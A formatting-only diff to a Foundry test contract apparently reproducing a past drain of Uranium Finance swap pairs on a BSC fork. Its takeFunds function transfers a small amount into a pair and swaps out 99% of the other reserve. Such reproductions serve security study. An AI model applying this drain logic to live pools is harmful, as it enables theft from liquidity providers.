@@ -27,10 +27,13 @@ address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
 address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
 
 interface IWrappedNative {
+
     function deposit() external payable;
+
 }
 
 contract Exploit is Test {
+
     function setUp() public {
         vm.createSelectFork("bsc", 6_920_000);
     }
@@ -48,19 +51,12 @@ contract Exploit is Test {
         console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(this)));
     }
 
-    function takeFunds(
-        address token0,
-        address token1,
-        uint256 amount
-    ) internal {
+    function takeFunds(address token0, address token1, uint256 amount) internal {
         IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
-        IUniswapV2Pair pair = IUniswapV2Pair(
-            factory.getPair(address(token1), address(token0))
-        );
+        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));
 
         IERC20(token0).transfer(address(pair), amount);
-        uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) /
-            100;
+        uint256 amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;
 
         pair.swap(
             pair.token0() == address(token1) ? amountOut : 0,
@@ -69,4 +65,5 @@ contract Exploit is Test {
             new bytes(0)
         );
     }
+
 }
